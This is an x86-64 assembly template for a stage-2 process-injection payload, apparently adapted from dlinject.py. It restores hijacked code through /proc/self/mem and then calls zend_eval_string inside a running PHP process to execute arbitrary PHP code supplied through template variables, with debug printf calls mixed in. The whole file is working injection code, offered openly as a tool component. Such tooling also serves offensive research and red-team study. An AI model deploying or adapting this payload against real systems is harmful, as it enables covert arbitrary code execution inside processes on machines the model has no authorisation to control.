.intel_syntax noprefix
.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// relative offsets for the following libraries required:
//		/usr/bin/phpN.N (same version as target process)
//		libc
//			Tested specifically with libc-[0-9\.]+.so
cld

	fxsave moar_regs[rip]

	// Open /proc/self/mem
	mov rax, 2                   # SYS_OPEN
	lea rdi, proc_self_mem[rip]  # path
	mov rsi, 2                   # flags (O_RDWR)
	xor rdx, rdx                 # mode
	syscall
	mov r15, rax  # save the fd for later

	// seek to code
	mov rax, 8      # SYS_LSEEK
	mov rdi, r15    # fd
	mov rsi, [VARIABLE:RIP:VARIABLE]  # offset
	xor rdx, rdx    # whence (SEEK_SET)
	syscall

	// restore code
	mov rax, 1                   # SYS_WRITE
	mov rdi, r15                 # fd
	lea rsi, old_code[rip]       # buf
	mov rdx, [VARIABLE:LEN_CODE_BACKUP:VARIABLE]   # count
	syscall

	// close /proc/self/mem
	mov rax, 3    # SYS_CLOSE
	mov rdi, r15  # fd
	syscall

	// move pushed regs to our new stack
	lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	// restore original stack
	mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	lea rsi, old_stack[rip]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	
	// BEGIN: call LIBC printf
	push rbx
	lea rsi, [rip]
	lea rdi, format_hex[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	//movabsq rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call LIBC printf

	// BEGIN: call LIBC printf
	push rbx
	lea rsi, [old_rip[rip]]
	lea rdi, format_hex[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call LIBC printf

	
	//debug
	push rbx
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] #from buffer
	syscall
	pop rbx
	///debug

	//debug
	push rbx
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 1 #from buffer
	syscall
	pop rbx
	///debug
	
	// BEGIN: call LIBC printf
	push rbx
	push rcx
	//mov rcx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	//mov rsi, [rcx]
	movabsq rsi, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	//mov rsi, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	lea rdi, format_hex[rip]
	xor rax, rax
	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	//movabsq rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
	call rbx
	pop rcx
	pop rbx
	// END: call LIBC printf
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 2 #from buffer
	syscall
	///debug

	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push rbx
	lea rdx, php_name[rip]	# arbitrary name
	mov rsi, 0				# return value pointer
	lea rdi, php_code[rip]	# PHP code
	//mov rax, varPythonHandle[rip]
	mov rbx, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:zend_eval_string:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call zend_eval_string("arbitrary PHP code here")
	
	# // BEGIN: call zend_eval_string("arbitrary PHP code here")
	# push rbx
	# mov rdi, 1	# PHP code
	# mov rax, 0
	# mov rbx, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:php_print_info:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call zend_eval_string("arbitrary PHP code here")
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 3 #from buffer
	syscall
	///debug
		
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 4 #from buffer
	syscall
	///debug
	
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 5 #from buffer
	syscall
	///debug
	
	mov rax, 0

	fxrstor moar_regs[rip]
	
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rbp
	pop rdx
	pop rcx
	pop rbx
	pop rax
	
	popf

	mov rsp, [VARIABLE:RSP:VARIABLE]
	
	jmp old_rip[rip]

old_rip:
	.quad [VARIABLE:RIP:VARIABLE]
	.align 16

old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]

old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]

	.align 16
moar_regs:
	.space 512

proc_self_mem:
	.ascii "/proc/self/mem\0"
	
php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

format_string:
	.ascii "DEBUG: %s\n\0"
	
format_hex:
	.ascii "DEBUG: 0x%llx\n\0"

dmsg:
	.ascii "123456789ABCDEF\0"

varFunctionAddress:
	.space 8
	.align 16
	
new_stack:
	.balign 0x8000

new_stack_base:


